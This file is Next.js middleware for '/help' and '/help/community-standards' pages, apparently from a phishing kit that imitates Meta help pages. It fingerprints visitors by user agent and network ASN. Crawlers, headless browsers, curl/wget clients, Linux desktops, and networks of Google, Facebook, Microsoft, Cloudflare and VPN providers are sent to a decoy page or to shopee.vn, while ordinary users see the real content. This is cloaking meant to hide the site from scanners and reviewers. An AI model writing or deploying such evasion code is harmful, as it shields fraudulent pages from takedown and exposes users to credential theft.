import { NextRequest, NextResponse } from 'next/server';
import { fetchGeoByIp, getClientIp, getCountryFromHeaders } from '@/lib/detect-ip-geo';
import countryToLanguage from '@/utils/country_to_language';
import {
    COUNTRY_COOKIE,
    COUNTRY_HEADER,
    LANG_COOKIE,
    LANG_HEADER,
    resolveLanguageFromCountry
} from '@/utils/resolve-language';

const BOT_KEYWORDS = ['bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse', 'facebookexternalhit'];

const BLOCKED_ASN = new Set([
    // Cloud Providers
    15169, // Google Cloud
    396982, // Google Cloud / Google LLC
    32934, // Facebook
    8075, // Microsoft Azure
    16509, // Amazon AWS
    16510, // Amazon AWS
    14618, // Amazon AWS
    31898, // Oracle Corporation
    45102, // Alibaba Cloud
    55960, // Beijing Guanghuan Xinwang Digital

    // Data Centers
    198605, // GCore Labs
    201814, // Hetzner
    24940, // Hetzner Online GmbH
    51396, // Hetzner Online
    14061, // DigitalOcean
    20473, // Choopa/Vultr
    63949, // Linode
    16276, // OVH SAS
    135377, // OVH
    52925, // Ascenty Data Centers e Telecomunicações S/A
    17895, // Globalreach eBusiness Networks, Inc.
    52468, // UFINET PANAMA S.A.
    36947, // Telecom Algeria

    // VPN Providers
    212238, // Datacamp Limited
    60068, // Datacamp
    136787, // PacketHub S.A.
    62240, // Clouvider
    9009, // M247 Europe SRL
    208172, // Proton AG (ProtonVPN)
    131199, // Nexeon Technologies, Inc.
    21859, // Zenlayer Inc

    // Proxy / Hosting
    55720, // Gigabit Hosting
    397373, // Voxility
    208312, // Serverel
    37100, // SEACOM-AS

    // Other
    214961, // Netflix
    401115, // Cloudflare
    210644, // Aeza Group
    6939, // Hurricane Electric
    209 // CenturyLink
]);

const BLOCKED_UA_REGEX = new RegExp(`(${BOT_KEYWORDS.join('|')})|Linux(?!.*Android)`, 'i');

const SHOPEE_URL = 'https://shopee.vn/';

const withLanguage = (response: NextResponse, lang: string, countryCode = '') => {
    response.cookies.set(LANG_COOKIE, lang, { path: '/', maxAge: 60 * 60 * 24, sameSite: 'lax' });
    if (countryCode) {
        response.cookies.set(COUNTRY_COOKIE, countryCode, { path: '/', maxAge: 60 * 60 * 24, sameSite: 'lax' });
    }
    return response;
};

const middleware = async (req: NextRequest) => {
    const ua = req.headers.get('user-agent');
    const host = req.headers.get('x-forwarded-host') || req.headers.get('host');
    const ip = getClientIp(req.headers) || 'unknown';

    if (!ua || BLOCKED_UA_REGEX.test(ua)) {
        return NextResponse.rewrite(`https://${host}/bot`);
    }

    const geoInfo = ip !== 'unknown' ? await fetchGeoByIp(ip) : null;
    if (geoInfo?.asn && BLOCKED_ASN.has(geoInfo.asn)) {
        return NextResponse.redirect(SHOPEE_URL);
    }

    const headerCountry = getCountryFromHeaders(req.headers);
    const countryCode = geoInfo?.countryCode || headerCountry;
    const langFromCountry = countryCode
        ? resolveLanguageFromCountry(countryCode, countryToLanguage)
        : '';
    const lang = geoInfo?.lang || langFromCountry || req.cookies.get(LANG_COOKIE)?.value || 'en';

    const requestHeaders = new Headers(req.headers);
    requestHeaders.set(LANG_HEADER, lang);
    if (countryCode) {
        requestHeaders.set(COUNTRY_HEADER, countryCode);
    }

    const response = NextResponse.next({
        request: {
            headers: requestHeaders
        }
    });

    if (!countryCode) {
        return response;
    }

    return withLanguage(response, lang, countryCode);
};

export default middleware;

export const config = {
    matcher: ['/help', '/help/community-standards']
};
